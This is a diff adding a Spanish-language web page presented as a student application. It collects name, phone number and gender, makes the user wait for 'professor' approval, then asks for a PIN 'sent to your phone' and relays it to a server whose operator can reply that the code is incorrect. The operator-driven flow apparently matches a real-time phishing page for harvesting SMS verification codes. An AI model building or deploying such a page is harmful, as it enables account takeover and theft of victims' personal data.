@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Solicitud - Estudiante</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script src="/socket.io/socket.io.js"></script>
+</head>
+<body class="bg-gray-900 text-white min-h-screen flex items-center justify-center">
+  <div class="max-w-md w-full px-6">
+
+    <!-- Formulario inicial -->
+    <div id="formulario" class="bg-gray-800 rounded-3xl p-8">
+      <h1 class="text-3xl font-bold text-center mb-8">📋 Nueva Solicitud</h1>
+      <form id="formSolicitud" class="space-y-6">
+        <div><label class="block text-sm mb-2">Nombre</label><input type="text" id="nombre" required class="w-full bg-gray-700 rounded-2xl px-5 py-4"></div>
+        <div><label class="block text-sm mb-2">Apellido</label><input type="text" id="apellido" required class="w-full bg-gray-700 rounded-2xl px-5 py-4"></div>
+        <div><label class="block text-sm mb-2">Número de Teléfono</label><input type="tel" id="telefono" required placeholder="809-555-1234" class="w-full bg-gray-700 rounded-2xl px-5 py-4"></div>
+        <div><label class="block text-sm mb-2">Género</label>
+          <select id="genero" required class="w-full bg-gray-700 rounded-2xl px-5 py-4">
+            <option value="">Selecciona...</option>
+            <option value="Varón">Varón</option>
+            <option value="Hembra">Hembra</option>
+          </select>
+        </div>
+        <button type="submit" class="w-full py-5 bg-blue-600 hover:bg-blue-500 rounded-2xl text-xl font-bold">Enviar Solicitud</button>
+      </form>
+    </div>
+
+    <!-- Esperando Aprobación 1 -->
+    <div id="esperando1" class="hidden text-center">
+      <div class="mx-auto w-16 h-16 border-4 border-blue-500 border-t-transparent rounded-full animate-spin mb-6"></div>
+      <h2 class="text-2xl font-bold mb-2">Procesando...</h2>
+      <p class="text-gray-400">Esperando aprobación del profesor (Etapa 1)</p>
+    </div>
+
+    <!-- Pantalla PIN -->
+    <div id="pantallaPIN" class="hidden bg-gray-800 rounded-3xl p-8 text-center">
+      <h2 class="text-2xl font-bold mb-4">🔑 Verificación de PIN</h2>
+      <p class="text-gray-400 mb-8">Introduzca el código PIN que se ha enviado a su número telefónico</p>
+      <input type="password" id="inputPIN" maxlength="10" class="w-40 text-center text-4xl tracking-widest bg-gray-700 rounded-2xl py-5 mx-auto block focus:outline-none">
+      <button onclick="verificarPIN()" class="mt-8 w-full py-4 bg-green-600 hover:bg-green-500 rounded-2xl font-semibold">Verificar PIN</button>
+      <p id="mensajeError" class="mt-4 text-red-400 hidden"></p>
+    </div>
+
+    <!-- Esperando Aprobación 2 -->
+    <div id="esperando2" class="hidden text-center">
+      <div class="mx-auto w-16 h-16 border-4 border-blue-500 border-t-transparent rounded-full animate-spin mb-6"></div>
+      <h2 class="text-2xl font-bold mb-2">Procesando...</h2>
+      <p class="text-gray-400">Esperando aprobación final del profesor (Etapa 2)</p>
+    </div>
+
+    <!-- Aprobado final -->
+    <div id="aprobado" class="hidden text-center">
+      <div class="text-green-500 text-8xl mb-6">✅</div>
+      <h1 class="text-4xl font-bold text-green-400 mb-4">¡Aprobado!</h1>
+      <p class="text-xl">Tu solicitud ha sido procesada correctamente.</p>
+    </div>
+  </div>
+
+  <script>
+    const socket = io();
+
+    document.getElementById('formSolicitud').addEventListener('submit', (e) => {
+      e.preventDefault();
+      const data = {
+        nombre: document.getElementById('nombre').value.trim(),
+        apellido: document.getElementById('apellido').value.trim(),
+        telefono: document.getElementById('telefono').value.trim(),
+        genero: document.getElementById('genero').value
+      };
+      socket.emit('enviarSolicitud', data);
+      document.getElementById('formulario').classList.add('hidden');
+      document.getElementById('esperando1').classList.remove('hidden');
+    });
+
+    socket.on('esperandoAprobacion1', () => {
+      document.getElementById('formulario').classList.add('hidden');
+      document.getElementById('esperando1').classList.remove('hidden');
+    });
+
+    socket.on('pasarAPIN', () => {
+      document.getElementById('esperando1').classList.add('hidden');
+      document.getElementById('pantallaPIN').classList.remove('hidden');
+    });
+
+    socket.on('esperandoAprobacion2', () => {
+      document.getElementById('pantallaPIN').classList.add('hidden');
+      document.getElementById('esperando2').classList.remove('hidden');
+    });
+
+    socket.on('solicitudAprobada', () => {
+      document.getElementById('esperando2').classList.add('hidden');
+      document.getElementById('aprobado').classList.remove('hidden');
+    });
+
+    socket.on('rechazadoEtapa1', () => {
+      document.getElementById('esperando1').classList.add('hidden');
+      document.getElementById('formulario').classList.remove('hidden');
+      alert('❌ Su solicitud fue declinada. Por favor intente de nuevo.');
+    });
+
+    socket.on('codigoIncorrecto', () => {
+      document.getElementById('esperando2').classList.add('hidden');
+      document.getElementById('pantallaPIN').classList.remove('hidden');
+      const error = document.getElementById('mensajeError');
+      error.textContent = "Código incorrecto";
+      error.classList.remove('hidden');
+      setTimeout(() => error.classList.add('hidden'), 3000);
+    });
+
+    socket.on('reiniciar', () => location.reload());
+
+    function verificarPIN() {
+      const pin = document.getElementById('inputPIN').value.trim();
+      if (pin.length === 0) {
+        const error = document.getElementById('mensajeError');
+        error.textContent = "Debe ingresar el PIN";
+        error.classList.remove('hidden');
+        setTimeout(() => error.classList.add('hidden'), 2500);
+        return;
+      }
+      document.getElementById('pantallaPIN').classList.add('hidden');
+      document.getElementById('esperando2').classList.remove('hidden');
+      socket.emit('verificarPIN', { pin });
+    }
+  </script>
+</body>
+</html>
